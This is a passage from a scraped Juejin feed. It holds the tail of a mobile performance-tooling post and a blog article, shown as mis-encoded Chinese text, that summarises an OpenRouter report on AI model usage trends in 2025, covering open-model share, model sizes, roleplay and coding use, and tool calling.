<li><strong>PerfDog</strong>ï¼šæ¸²æŸ“æ€§èƒ½ä¸äº¤äº’æ€§èƒ½</li>
<li><strong>Safari Inspector</strong>ï¼šWebView æ€§èƒ½</li>
<li><strong>Charles</strong>ï¼šç½‘ç»œé“¾è·¯æ€§èƒ½</li>
<li><strong>MetricKit</strong>ï¼šçº¿ä¸Šè¡¨ç°</li>
<li><strong>Crashlytics</strong>ï¼šæ€§èƒ½ç›¸å…³å¼‚å¸¸</li>
</ul>
<p>åªæœ‰å…¨é“¾è·¯èƒ½åŠ›é½å¤‡ï¼Œæ‰èƒ½çœŸæ­£è§£å†³å¤æ‚æ€§èƒ½é—®é¢˜ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ†æäº† 100 ä¸‡äº¿ Token åï¼Œå¾—å‡ºçš„å‡ ä¸ªå…³äº AI çš„çœŸç›¸]]></title>    <link>https://juejin.cn/post/7581004702945263643</link>    <guid>https://juejin.cn/post/7581004702945263643</guid>    <pubDate>2025-12-08T04:16:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581004702945263643" data-draft-id="7580971667037077530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ†æäº† 100 ä¸‡äº¿ Token åï¼Œå¾—å‡ºçš„å‡ ä¸ªå…³äº AI çš„çœŸç›¸"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-08T04:16:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ConardLi"/> <meta itemprop="url" content="https://juejin.cn/user/3949101466785709"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ†æäº† 100 ä¸‡äº¿ Token åï¼Œå¾—å‡ºçš„å‡ ä¸ªå…³äº AI çš„çœŸç›¸
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3949101466785709/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ConardLi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:16:27.000Z" title="Mon Dec 08 2025 04:16:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025 æ³¨å®šæ˜¯è¦è¢«è½½å…¥ AI å²å†Œçš„ä¸€å¹´ï¼Œå¤§æ¨¡å‹æ‰å †å‘å¸ƒã€å¼€æºç”Ÿæ€ç©ºå‰ç¹è£...</p>
<p>ä½†æŠ€æœ¯çªç ´çš„å–§åš£ä¹‹å¤–ï¼ŒçœŸå®ä¸–ç•Œç©¶ç«Ÿå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</p>
<p>å¤§å®¶å¥½ï¼Œæ¬¢è¿æ¥åˆ° codeç§˜å¯†èŠ±å›­ï¼Œæˆ‘æ˜¯èŠ±å›­è€å¸ˆï¼ˆConardLiï¼‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17a129d6a2624546af4e841be70b8de3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=yiCcRUYZRG57NULaVoYQhyda%2Fsc%3D" alt="" loading="lazy"/></p>
<p>æœ€è¿‘ï¼Œ<code>OpenRouter</code> å‘å¸ƒäº†ä¸€ä»½éå¸¸ç¡¬æ ¸çš„ AI æŠ€æœ¯æŠ¥å‘Šï¼Œå®ƒé€šè¿‡åˆ†ææµ·é‡çš„ LLM è¯·æ±‚è°ƒç”¨è®°å½•ï¼ˆè¶…è¿‡ 100 ä¸‡äº¿ Tokenï¼‰ï¼Œèƒ½çœ‹åˆ°å…¨çƒç”¨æˆ·åˆ°åº•åœ¨ç”¨ä»€ä¹ˆæ¨¡å‹ã€å¹²ä»€ä¹ˆäº‹å„¿ã€æ„¿æ„èŠ±å¤šå°‘é’±ï¼Œå¹¶ä¸”è¯•å›¾ç»˜åˆ¶å‡ºä¸€å¼ æœ€çœŸå®çš„ <strong>â€˜å…¨çƒ AI åœ°å½¢å›¾â€™</strong>ã€‚å¦‚æœä½ è¿˜è®¤ä¸ºå¼€æºæ¨¡å‹åªæ˜¯é™ªè·‘ã€é™ä»·å°±èƒ½æ¢æ¥ç”¨æˆ·ã€æˆ–è€…åŒ—ç¾ä¾ç„¶å„æ–­ä¸€åˆ‡ï¼Œé‚£ä¹ˆè¿™ç¯‡æŠ¥å‘Šå°†å½»åº•é‡å¡‘ä½ çš„ä¸–ç•Œè§‚ã€‚</p>
<p>è¿™ä»½æŠ¥å‘Šéå¸¸é•¿ï¼Œä¸‹é¢æ˜¯æˆ‘æ€»ç»“çš„ä¸€äº›å…³é”®é‡ç‚¹å†…å®¹ï¼Œè®©æˆ‘ä»¬ä¸€èµ·æ¥å­¦ä¹ ä¸€ä¸‹ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€å¼€æºå’Œé—­æºæ¨¡å‹</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d5975eed6a04a2c9e3d7c3bc9c40c02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=ddxiraE%2F4HsC%2FjJN8GbySYiQhxI%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>å°½ç®¡æ¥è‡ªåŒ—ç¾å¤§å‚çš„é—­æºæ¨¡å‹ä¾ç„¶å æ®ä¸»å¯¼åœ°ä½ï¼ˆå¹³å‡çº¦å  70% çš„ä»½é¢ï¼‰ï¼Œä½†å¼€æºæ¨¡å‹çš„ä½¿ç”¨é‡åœ¨ 2025 å¹´ç¨³æ­¥å¢é•¿ï¼Œåˆ°äº†å¹´åº•å·²ç»æ‹¿ä¸‹äº†çº¦ä¸‰åˆ†ä¹‹ä¸€çš„å¸‚åœºä»½é¢ï¼Œå½¢æˆäº†ä¸€ç§ç›¸å¯¹ç¨³å®šçš„å¹³è¡¡ã€‚</p>
</li>
<li>
<p>å¼€æºæ¨¡å‹çš„å¢é•¿çš„ä¸»è¦åŠ¨åŠ›æ¥è‡ªä¸­å›½å¼€å‘çš„æ¨¡å‹ã€‚ä» 2024 å¹´åº•å¾®ä¸è¶³é“çš„ 1.2% èµ·æ­¥ï¼Œä¸­å›½å¼€æºæ¨¡å‹å‡­å€Ÿå¿«é€Ÿçš„è¿­ä»£å‘¨æœŸå’Œè¿‡ç¡¬çš„è´¨é‡ï¼ˆå¦‚ Qwen å’Œ DeepSeek ç³»åˆ—ï¼‰ï¼Œè¿…é€ŸæŠ¢å å¸‚åœºï¼Œåœ¨æŸäº›æ—¶æ®µç”šè‡³è´¡çŒ®äº†è¿‘ 30% çš„æ€»ä½¿ç”¨é‡ã€‚</p>
</li>
<li>
<p>æ•°æ®çš„é£™å‡å¾€å¾€ç´§éšé‡ç£…æ¨¡å‹çš„å‘å¸ƒï¼ˆå¦‚ DeepSeek V3ã€Kimi K2 ç­‰ï¼‰ï¼Œä½†å…³é”®åœ¨äºï¼Œè¿™äº›å¢é•¿åœ¨å‘å¸ƒçƒ­åº¦é€€å»åä¾ç„¶å¾—ä»¥ä¿æŒã€‚è¿™è¯´æ˜ç”¨æˆ·ä¸ä»…ä»…æ˜¯åœ¨å°é²œï¼Œè€Œæ˜¯çœŸæ­£å°†è¿™äº›å¼€æºæ¨¡å‹æŠ•å…¥åˆ°äº†é•¿æœŸçš„ç”Ÿäº§ç¯å¢ƒä¸­ã€‚</p>
</li>
</ul>
<h2 data-id="heading-1">äºŒã€å¼€æºæ¨¡å‹ä»â€œä¸€å®¶ç‹¬å¤§â€èµ°å‘â€œç™¾èŠ±é½æ”¾â€</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/626c65fca93b45ddbd500793d5593f0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=Qu7bsT1BmzYRf83VKxzr%2BcQKQz8%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>å¼€æºæ¨¡å‹å¸‚åœºåœ¨è¿‡å»ä¸€å¹´å‘ç”Ÿäº†å‰§å˜ã€‚è™½ç„¶ DeepSeek åœ¨æ€»æµé‡ä¸Šä¾ç„¶é¢†å…ˆï¼Œä½†å®ƒæ›¾ç»å æ®â€œåŠå£æ±Ÿå±±â€ï¼ˆè¶…è¿‡ 50%ï¼‰çš„ç»Ÿæ²»åœ°ä½å·²è¢«æ‰“ç ´ã€‚åˆ°äº† 2025 å¹´åº•ï¼Œæ²¡æœ‰ä»»ä½•å•ä¸€æ¨¡å‹èƒ½ç‹¬å è¶…è¿‡ <code>25%</code> çš„ä»½é¢ï¼Œå‰å‡ åçš„å·®è·æ­£åœ¨ç¼©å°ï¼Œå¸‚åœºå˜å¾—æ›´åŠ å‡è¡¡ã€‚</p>
</li>
<li>
<p>æ–°æ™‹â€œé»‘é©¬â€ä¸Šä½ç¥é€Ÿ ç”¨æˆ·åˆ‡æ¢æ¨¡å‹çš„é—¨æ§›å¾ˆä½ï¼Œä¸”éå¸¸ä¹æ„å°é²œã€‚åƒ <code>Qwenã€MiniMaxã€Kimi</code> ä»¥åŠ <code>GPT-OSS</code> ç­‰æ–°æ¨¡å‹ï¼Œä¸€ç»å‘å¸ƒå°±èƒ½åœ¨å‡ å‘¨å†…è¿…é€ŸæŠ¢å å¤§é‡å¸‚åœºä»½é¢ã€‚è¿™è¯´æ˜åªè¦æ¨¡å‹åœ¨èƒ½åŠ›æˆ–æ•ˆç‡ä¸Šæœ‰çªç ´ï¼Œå°±èƒ½ç«‹åˆ»è·å¾—ç¤¾åŒºçš„è®¤å¯ã€‚</p>
</li>
<li>
<p>æŒç»­è¿­ä»£æ˜¯ç”Ÿå­˜çš„å…³é”®ï¼Œåœ¨è¿™ä¸ªç«äº‰æ¿€çƒˆçš„ç”Ÿæ€é‡Œï¼Œâ€œåƒè€æœ¬â€ è¡Œä¸é€šã€‚<code>DeepSeek</code> ä¹‹æ‰€ä»¥èƒ½åœ¨æ–°ç§€è¾ˆå‡ºçš„ç¯å¢ƒä¸‹ä¾ç„¶ä¿æŒå¤´éƒ¨åœ°ä½ï¼Œå…¨é ä¸æ–­æ¨å‡ºæ–°ç‰ˆæœ¬ã€‚åä¹‹ï¼Œé‚£äº›åœæ­¢æ›´æ–°æˆ–è¿­ä»£ç¼“æ…¢çš„æ¨¡å‹ï¼Œå…¶å¸‚åœºä»½é¢å¾ˆå¿«å°±ä¼šè¢«æ›´å‹¤å¥‹çš„ç«äº‰å¯¹æ‰‹ç“œåˆ†ã€‚</p>
</li>
</ul>
<h2 data-id="heading-2">ä¸‰ã€å¼€æºæ¨¡å‹å°ºå¯¸æ–°é£å‘ï¼šâ€œä¸­å‹â€å´›èµ·ï¼Œâ€œå°å‹â€å¤±å® </h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68ad1795535c4915829f792d0e26277e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=ky5QOrfYhPezZvvrhQ6J0rCVymM%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>è™½ç„¶å¸‚é¢ä¸Šä¸æ–­æ¶Œç°æ–°çš„å°æ¨¡å‹ï¼ˆ15B å‚æ•°ä»¥ä¸‹ï¼‰ï¼Œä½†å®ƒä»¬çš„ä½¿ç”¨ä»½é¢åè€Œåœ¨ä¸‹é™ã€‚è¿™ä¸ªèµ›é“æå…¶æ‹¥æŒ¤ï¼Œç”¨æˆ·å¿ è¯šåº¦å¾ˆä½ï¼Œæ€»æ˜¯åœ¨ä¸æ–­å°è¯•æ–°å‡ºçš„æ¨¡å‹ï¼ˆå¦‚ Google Gemma 3 ç­‰ï¼‰ï¼Œå¯¼è‡´æ²¡æœ‰ä»»ä½•ä¸€ä¸ªå°æ¨¡å‹èƒ½é•¿æœŸåç¨³ä½ç½®ã€‚</p>
</li>
<li>
<p>â€œä¸­å‹æ¨¡å‹â€ï¼ˆ15B åˆ° 70B å‚æ•°ï¼‰æˆäº†å¸‚åœºçš„æ–°å® ã€‚è‡ªä» Qwen2.5 Coder 32B è¯æ˜äº†è¿™ä¸ªé‡çº§çš„æ½œåŠ›åï¼ŒMistral å’Œ GPT-OSS ç­‰åç»­è·Ÿè¿›è€…è¿…é€Ÿæ‰©å¤§äº†è¿™ä¸€å¸‚åœºã€‚ç”¨æˆ·å‘ç°ï¼Œè¿™ç±»æ¨¡å‹åœ¨<strong>èƒ½åŠ›</strong>å’Œ<strong>è¿è¡Œæ•ˆç‡</strong>ä¹‹é—´æ‰¾åˆ°äº†å®Œç¾çš„å¹³è¡¡ï¼Œæ€§ä»·æ¯”æé«˜ã€‚</p>
</li>
<li>
<p>åœ¨å¤§æ¨¡å‹ï¼ˆ70B å‚æ•°ä»¥ä¸Šï¼‰é¢†åŸŸï¼Œä¸å†æ˜¯æŸä¸€ä¸ªæ¨¡å‹â€œèµ¢å®¶é€šåƒâ€ã€‚ç°åœ¨çš„è¶‹åŠ¿æ˜¯<strong>ç™¾èŠ±é½æ”¾</strong>ï¼Œç”¨æˆ·ä¼šåŒæ—¶ä½¿ç”¨å’Œè¯„ä¼°å¤šä¸ªé¡¶çº§æ¨¡å‹ï¼ˆå¦‚ Qwen3ã€GLM 4.5ã€GPT-OSS-120B ç­‰ï¼‰ï¼Œæ ¹æ®å®é™…è¡¨ç°çµæ´»åˆ‡æ¢ï¼Œè€Œä¸æ˜¯æ­»å®ˆå•ä¸€æ ‡å‡†ã€‚</p>
</li>
</ul>
<blockquote>
<p>ç®€å•æ¥è¯´ï¼Œå°æ¨¡å‹ä¸»å¯¼å¼€æºç”Ÿæ€çš„æ—¶ä»£å¯èƒ½å·²ç»ç»“æŸäº†ã€‚ç°åœ¨çš„å¸‚åœºæ­£åœ¨åˆ†åŒ–ï¼šç”¨æˆ·è¦ä¹ˆè½¬å‘<strong>æ›´ç¨³å¥çš„ä¸­å‹æ¨¡å‹</strong>ä»¥æ±‚å¹³è¡¡ï¼Œè¦ä¹ˆç›´æ¥ä¸Š<strong>å¤§æ¨¡å‹</strong>ä»¥æ±‚æè‡´æ€§èƒ½ã€‚</p>
</blockquote>
<h2 data-id="heading-3">å››ã€å¼€æºæ¨¡å‹çš„ä¸»è¦ç”¨é€”ä¸åº”ç”¨è¶‹åŠ¿</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48165b0273e347a399f9417abc4ab30c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=2IEvJkPfLzKfkXZYYtCn0kSX6lY%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>ç›®å‰çš„å¼€æºæ¨¡å‹å¹¶éé›¨éœ²å‡æ²¾ï¼Œè€Œæ˜¯é›†ä¸­åœ¨<strong>è§’è‰²æ‰®æ¼”ï¼ˆRoleplayï¼‰<strong>å’Œ</strong>ç¼–ç¨‹è¾…åŠ©</strong>è¿™ä¸¤ä¸ªé¢†åŸŸã€‚è¿™ä¸¤ç±»ä»»åŠ¡å æ®äº†ç»å¤§å¤šæ•°çš„ Token ç”¨é‡ã€‚å°¤å…¶æ˜¯è§’è‰²æ‰®æ¼”ï¼Œå æ®äº†æ€»æµé‡çš„åŠå£æ±Ÿå±±ï¼ˆè¶…è¿‡ 50%ï¼‰ï¼Œè¿™ä¸»è¦æ˜¯å› ä¸ºå¼€æºæ¨¡å‹é€šå¸¸å—åˆ°çš„å†…å®¹å®¡æŸ¥é™åˆ¶è¾ƒå°‘ï¼Œæ›´é€‚åˆéœ€è¦åˆ›æ„ã€æƒ…æ„Ÿäº’åŠ¨æˆ–ä¸ªæ€§åŒ–å®šåˆ¶çš„å¨±ä¹åœºæ™¯ã€‚</p>
</li>
<li>
<p>å¦‚æœæŠŠç›®å…‰èšç„¦åœ¨ä¸­å›½å¼€å‘çš„å¼€æºæ¨¡å‹ï¼ˆå¦‚ Qwen å’Œ DeepSeekï¼‰ä¸Šï¼Œä¼šå‘ç°å®ƒä»¬çš„ä½¿ç”¨ç»“æ„æœ‰æ‰€ä¸åŒã€‚è™½ç„¶è§’è‰²æ‰®æ¼”ä»æ˜¯ç¬¬ä¸€å¤§ç±»ï¼Œä½†<strong>ç¼–ç¨‹å’ŒæŠ€æœ¯ç±»ä»»åŠ¡</strong>çš„åˆè®¡å æ¯”ï¼ˆçº¦ 39%ï¼‰æ˜¾è‘—é«˜äºå…¨çƒå¹³å‡æ°´å¹³ã€‚è¿™è¯´æ˜å›½äº§å¼€æºæ¨¡å‹æ­£è¶Šæ¥è¶Šå¤šåœ°è¢«ç”¨äºå®é™…çš„ä»£ç ç”Ÿæˆå’Œç”Ÿäº§åŠ›å·¥å…·ä¸­ï¼Œè€Œä¸ä»…ä»…æ˜¯å¨±ä¹ã€‚</p>
</li>
<li>
<p>åœ¨å†™ä»£ç è¿™ä»¶äº‹ä¸Šï¼Œè™½ç„¶é—­æºæ¨¡å‹ï¼ˆå¦‚ Claudeï¼‰ä¾ç„¶å æ®æ•´ä½“ä¸»å¯¼åœ°ä½ï¼Œä½†åœ¨å¼€æºé¢†åŸŸå†…éƒ¨ï¼Œç«äº‰éå¸¸åŠ¨æ€ã€‚å¼€å‘è€…éå¸¸åŠ¡å®ï¼Œâ€œè°å¼ºç”¨è°â€ â€”â€” æµé‡æ›¾åœ¨ 2025 å¹´ä¸­æœŸå‘å›½äº§æ¨¡å‹å€¾æ–œï¼Œéšååˆå› è¥¿æ–¹æ¨¡å‹ï¼ˆå¦‚ LLaMA ç³»åˆ—ï¼‰çš„æ›´æ–°è€Œå›æµã€‚è¿™è¡¨æ˜å¼€æºç¼–ç¨‹åŠ©æ‰‹çš„å¸‚åœºä»½é¢å¯¹æ¨¡å‹è´¨é‡çš„ååº”æå…¶æ•æ„Ÿã€‚</p>
</li>
</ul>
<h2 data-id="heading-4">äº”ã€æ™ºèƒ½ä½“æ¨ç†çš„å´›èµ·</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c8338f4a3c8e4260a1282516dfbbcd7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=hewB%2Bmz5aoxSZge5jI6TDTJm46Y%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>æ¨¡å‹ä¸å†ä»…ä»…ç”¨äºç®€å•çš„å•è½®æ–‡æœ¬ç”Ÿæˆæˆ–è¡¥å…¨ï¼Œè€Œæ˜¯è¶Šæ¥è¶Šå¤šåœ°è¢«ç”¨äºæ‰§è¡Œ<strong>å¤šæ­¥éª¤è§„åˆ’ã€å·¥å…·è°ƒç”¨ä»¥åŠå¤æ‚çš„é€»è¾‘æ¨ç†ä»»åŠ¡</strong>ã€‚è¿™æ ‡å¿—ç€ AI ä»å•çº¯çš„â€œèŠå¤©æœºå™¨äººâ€å‘èƒ½è§£å†³å¤æ‚é—®é¢˜çš„â€œæ™ºèƒ½ä½“â€è¿›åŒ–ã€‚</p>
</li>
<li>
<p>è‡ª 2025 å¹´åˆä»¥æ¥ï¼Œæµç»â€œæ¨ç†ä¼˜åŒ–å‹æ¨¡å‹â€çš„ Token ä»½é¢æ€¥å‰§ä¸Šå‡ï¼Œç›®å‰å·²<strong>è¶…è¿‡æ€»æµé‡çš„ 50%</strong>ã€‚è¿™å¾—ç›Šäºä¾›ç»™ä¾§ï¼ˆGPT-5ã€Claude 4.5ã€Gemini 3 ç­‰å¼ºåŠ›æ¨¡å‹çš„å‘å¸ƒï¼‰å’Œéœ€æ±‚ä¾§ï¼ˆç”¨æˆ·å¯¹å¤„ç†å¤æ‚çŠ¶æ€å’Œé€»è¾‘çš„éœ€æ±‚å¢åŠ ï¼‰çš„åŒé‡æ¨åŠ¨ã€‚</p>
</li>
</ul>
<h2 data-id="heading-5">å…­ã€å·¥å…·è°ƒç”¨åŠ é€Ÿæ™®åŠ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55e1d57d2de247dab7ab74410da94c27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=11JSUUVw9epmLxgI32Kh1JAjnWQ%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>æ•°æ®æ˜¾ç¤ºï¼Œå…¨å¹´çš„â€œå·¥å…·å®é™…è°ƒç”¨é‡â€ï¼ˆå³æ¨¡å‹çœŸæ­£æ‰§è¡Œäº†å¤–éƒ¨å·¥å…·æ“ä½œï¼Œè€Œéä»…ä»…æ˜¯å…·å¤‡è¯¥åŠŸèƒ½ï¼‰å‘ˆç°å‡ºæŒç»­ã€ç¨³æ­¥çš„ä¸Šå‡è¶‹åŠ¿ã€‚é™¤å» 5 æœˆä»½å› ä¸ªåˆ«å¤§æˆ·é€ æˆçš„çŸ­æš‚æ•°æ®å¼‚å¸¸å¤–ï¼Œæ•´ä½“è¶‹åŠ¿éå¸¸æ˜ç¡®ï¼šAI æ­£åœ¨ä»å•çº¯çš„å¯¹è¯è€…ï¼Œè½¬å˜ä¸ºèƒ½å¹²æ´»çš„æ‰§è¡Œè€…ã€‚</p>
</li>
<li>
<p>åœ¨ 2025 å¹´åˆï¼Œå·¥å…·è°ƒç”¨é¢†åŸŸåŸºæœ¬è¢« OpenAIï¼ˆgpt-4o-miniï¼‰å’Œ Anthropicï¼ˆClaude 3.5/3.7 ç³»åˆ—ï¼‰å„æ–­ã€‚ä½†åˆ°äº†ä¸‹åŠå¹´ï¼Œå±€é¢å‘ç”Ÿäº†æ˜¾è‘—å˜åŒ–ï¼š<strong>Claude 4.5 Sonnet</strong> è¿…é€ŸæŠ¢å å¸‚åœºä»½é¢ï¼ŒåŒæ—¶ <strong>Grok Code Fast</strong> å’Œ <strong>GLM 4.5</strong> ç­‰æ–°æ¨¡å‹ä¹Ÿå¼ºåŠ¿å…¥å±€ã€‚è¿™è¡¨æ˜æ”¯æŒ Agent èƒ½åŠ›çš„åº•å±‚æ¨¡å‹é€‰æ‹©å˜å¾—æ›´åŠ ä¸°å¯Œäº†ã€‚</p>
</li>
<li>
